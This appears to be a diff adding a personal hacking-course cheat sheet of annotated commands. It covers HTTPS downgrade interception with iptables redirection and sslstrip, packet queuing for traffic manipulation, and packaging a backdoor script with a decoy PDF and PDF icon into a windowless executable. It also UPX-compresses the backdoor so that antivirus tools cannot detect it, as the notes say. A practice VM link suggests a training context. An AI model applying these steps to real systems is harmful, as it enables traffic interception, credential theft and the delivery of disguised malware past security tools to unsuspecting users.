@@ -1,0 +1,49 @@
+HACKER MACHINE
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000   (this command redirects packets coming from webservers trying to go into port 80 into port 10000, so that sslstrip can downgrade from HTTPS to HTTP)
+
+
+iptables --flush   (restores original iptables, original ports)
+
+
+iptables -I INPUT -j NFQUEUE --queue-num 0   (all packets coming into your computer are added to the queue/waiting list number 0)
+
+
+iptables -I OUTPUT -j NFQUEUE --queue-num 0   (all packets coming out of your computer are added to the queue/waiting list number 0)
+
+
+sslstrip   (starts running sslstrip)
+
+
+
+GENERAL
+
+https://information.rapid7.com/metasploitable/download.html (to download Linux OS distribution made to practice hacking on)
+
+
+
+
+
+WINDOWS MACHINE
+
+
+wine /root/.../pyinstaller.exe --onefile --noconsole file.py (turns it into windows executable)
+
+
+wine /root/.../pyinstaller.exe --add-data "/root/.../sample.pdf;." --onefile --noconsole --icon /root/.../pdf_icon.ico file.py (turns two files into one windows executable. The executable is going to be stored in temp folder by default, but you can change it by putting the path you want instead of the dot after the semicolon. The icon makes the executable have the icon that you give it)
+
+./upx /root/.../reverse_backdoor.exe -o compressed_backdoor.py (upx is a program you get from GitHub that compresses exe's so that antiviruses cannot detect your file)
+
+
+
+OSX MACHINE
+
+pyinstaller --onefile --noconsole --icon pdf.icns file.py (very similar to the command on Windows two paragraphs above)
+
+
+
+LINUX MACHINE
+MAKING EXECUTABLE ON LINUX TARGET MACHINE
+1) pyinstaller --onefile --noconsole file.py (linux version of the command)
+
+2) chmod +x filename (changes the permissions to make it a working executable)
